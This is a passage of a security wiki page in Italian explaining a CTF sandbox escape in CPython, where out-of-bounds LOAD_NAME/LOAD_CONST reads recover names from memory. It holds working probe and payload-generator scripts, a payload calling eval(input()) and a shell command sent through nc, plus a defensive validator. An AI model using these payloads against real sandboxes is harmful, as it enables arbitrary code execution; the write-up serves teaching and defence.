# OOB Read dell'opcode LOAD_NAME / LOAD_CONST

Questa pagina adatta il writeup originale e la exploit chain di Splitline per "V O I D" dell'HITCON CTF 2022.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Un operando `LOAD_NAME` o `LOAD_CONST` può leggere al di fuori di una tupla `co_names` o `co_consts` deliberatamente accorciata. In questa challenge, vengono usati nomi dummy irraggiungibili finché un'entry vicina non contiene un attributo utile come `__getattribute__`.<sup>[[1]](#references)</sup>

Il payload rimanente riutilizza il nome recuperato per costruire una sandbox escape.<sup>[[1]](#references)</sup>

### Panoramica <a href="#overview-1" id="overview-1"></a>

Il wrapper della challenge è breve e compila una singola espressione prima di valutarla:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
L'input viene compilato in un code object Python, quindi il wrapper sostituisce i suoi `co_consts` e `co_names` con tuple vuote prima di chiamare `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Qualsiasi istruzione generata che indicizzi ancora una di queste tabelle può causare un crash dell'interprete o esporre un puntatore a un oggetto adiacente, a seconda della build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Come avviene il segfault?

Per un'espressione di tipo lista come `[a, b, c]`, il compilatore genera istruzioni `LOAD_NAME` con operandi consecutivi:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Se `co_names` viene sostituito con `()`, il bytecode contiene ancora `LOAD_NAME 2`; un accesso non verificato alla tupla può quindi recuperare un puntatore al di fuori della tupla invece di generare `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` e `LOAD_CONST` sono le primitive fondamentali in questo caso: i loro operandi interi selezionano rispettivamente le voci in `co_names` e `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

Nel dispatch di CPython, `LOAD_CONST` recupera la voce selezionata della tupla e la inserisce nello stack; le build release utilizzano un accessor non verificato per le tuple:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Sonda operandi `LOAD_NAME` crescenti sull'interprete target per mappare le entry utili. Splitline ha osservato offset superiori a 700 nell'ambiente della challenge, ma il layout dipende dalla build; un debugger può aiutare a ispezionare la memoria circostante.<sup>[[1]](#references)</sup>

### Generazione dell'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una volta che un offset restituisce un nome utile, inserisci la ricerca fuori limite in un'espressione irraggiungibile e fai riferimento allo stesso slot `co_names` da un accesso ad attributo raggiungibile.<sup>[[1]](#references)</sup>

Ad esempio, se l'offset 5 restituisce `__getattribute__`, mantieni quel nome nello slot 5 mentre il ramo falso esegue la ricerca utile:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Il testo recuperato non deve necessariamente essere `__getattribute__`; qualsiasi identificatore che serva al payload può occupare lo slot.<sup>[[1]](#references)</sup>

Il compilatore riutilizza uno slot `co_names` per le occorrenze ripetute di uno stesso nome, come illustrato dal disassemblaggio:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Poiché `LOAD_ATTR` risolve anch'esso il proprio nome tramite `co_names`, il branch raggiungibile può riutilizzare quello slot; gli operandi packed nelle versioni più recenti di CPython sono descritti nelle note sulla versione riportate di seguito.<sup>[[1]](#references)[[2]](#references)</sup>

Piccoli interi non negativi possono essere sintetizzati da espressioni booleane senza costanti:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

L'exploit originale usava nomi anziché costanti per rientrare nel limite di lunghezza della challenge.<sup>[[1]](#references)</sup>

Questo helper analizza gli offset dei nomi candidati costruendo un code object con una tupla `co_names` vuota.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Il generatore riportato di seguito associa gli offset recuperati ai nomi ed emette il payload a livello sorgente.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
A livello generale, il payload generato ottiene i globals di una funzione, recupera `builtins` e chiama `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Note sulla versione e opcode interessati (Python 3.11–3.13)

- Su CPython 3.11–3.13, le istruzioni usano ancora operandi interi per indicizzare le tabelle delle costanti e dei nomi dell'oggetto code. Se una delle due tuple è più corta dell'indice referenziato, un accesso non verificato può leggere un puntatore a un oggetto adiacente e causare un crash o operare su di esso; il comportamento esatto dipende dalla build dell'interprete.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` e (3.12+) `RETURN_CONST consti` leggono `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Gli utenti diretti della tabella dei nomi includono `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` e (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` e `LOAD_ATTR namei` usano `co_names[namei >> 1]`; il bit meno significativo controlla il comportamento NULL/metodo documentato. (3.12+) `LOAD_SUPER_ATTR namei` usa `co_names[namei >> 2]` e inserisce due flag nei bit meno significativi.<sup>[[2]](#references)</sup>
- Python 3.11+ ha introdotto cache adaptive/inline che aggiungono voci `CACHE` nascoste tra le istruzioni. Il bytecode creato manualmente deve tenere conto di tali voci durante la costruzione di `co_code`.<sup>[[2]](#references)</sup>

Implicazione pratica: il layout del bytecode e gli offset recuperati sono specifici della release e della build. Testa la tecnica e qualsiasi payload generato rispetto alla versione CPython di destinazione prima di farvi affidamento.<sup>[[2]](#references)</sup>

### Scanner rapido per indici OOB utili (compatibile con 3.11+/3.12+)

Se preferisci cercare direttamente oggetti interessanti dal bytecode invece che dal source di livello superiore, puoi generare oggetti code minimali e fare brute-force degli indici. L'helper seguente inserisce le inline cache in base ai metadata `dis` dell'interprete di destinazione.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Note
- Per sondare invece i nomi, sostituisci `LOAD_CONST` con `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e adatta l'uso dello stack e l'operando impacchettato per l'opcode target.<sup>[[2]](#references)</sup>
- Usa `EXTENDED_ARG` o più byte di `arg` per raggiungere, se necessario, indici >255. Questo helper emette solo il byte basso dell'operando, quindi per indici più grandi sono necessarie la costruzione di byte grezzi o più load.<sup>[[2]](#references)</sup>

### Pattern RCE minimale solo bytecode (co_consts OOB → builtins → eval/input)

Una volta identificato un indice di `co_consts` che risolve nel modulo builtins, puoi ricostruire `eval(input())` senza `co_names` manipolando lo stack. Il materiale ufficiale di B01lers CTF 2024 `awpcode` documenta questo stesso pattern di OOB-read.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Questo approccio basato esclusivamente sullo stack è utile quando una challenge ti offre il controllo diretto su `co_code`, imponendo al contempo `co_consts=()` e `co_names=()`; evita i trick a livello di sorgente e può mantenere piccoli i payload utilizzando operazioni sullo stack del bytecode e tuple builders.<sup>[[4]](#references)</sup>

### Controlli difensivi e mitigazioni per le sandbox

Se stai scrivendo una sandbox Python che compila o valuta codice non attendibile, non fare affidamento su CPython per verificare i limiti degli indici delle tuple utilizzati dal bytecode. Valida gli oggetti codice prima di eseguirli.<sup>[[2]](#references)[[3]](#references)</sup>

Validator pratico (rifiuta gli accessi OOB a co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Idee aggiuntive per la mitigazione
- Non consentire `CodeType.replace(...)` arbitrari su input non attendibili, oppure aggiungere controlli strutturali rigorosi sull’oggetto code risultante.
- Valutare l’esecuzione del codice non attendibile in un processo separato con sandboxing a livello del sistema operativo (seccomp, job objects, container) invece di affidarsi alla semantica di CPython.

## References

- [1] [Writeup di Splitline sul HITCON CTF 2022 "V O I D" (origine di questa tecnica e catena di exploit di alto livello)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentazione di `dis` di Python 3.13 (indici del bytecode, operandi name impacchettati e inline cache)](https://docs.python.org/3.13/library/dis.html)
- [3] [Macro di accesso alle tuple di CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Writeup della challenge `awpcode` del B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [C API di Python: oggetti code](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
